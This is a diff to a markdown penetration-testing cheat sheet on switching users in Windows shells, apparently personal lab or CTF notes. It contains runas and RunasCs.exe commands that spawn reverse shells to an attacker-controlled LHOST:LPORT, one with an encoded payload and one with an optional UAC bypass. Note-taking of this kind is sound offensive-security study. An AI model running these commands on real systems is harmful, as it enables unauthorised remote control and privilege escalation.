@@ -10,15 +10,19 @@ su -l <user>
 #### RunAs
 This is the most convenient way but sometimes the shell we has is booty cheeks and this will not work because it requires us to enter the password in an interactive manner
 
+Runas
 ```powershell
 # general usage
 runas /user:<domain>\<user> cmd.exe
 
 # revshell
 runas /user:<domain>\<user> powershell.exe -e <base64_revshell>
-
 ```
 
+RunasCs.exe 
+```powershell
+.\RunasCs.exe <user> <password> powershell -r <LHOST>:<LPORT> [--bypass-uac]
+```
 #### Powershell
 First spawn a powershell interactive shell
 
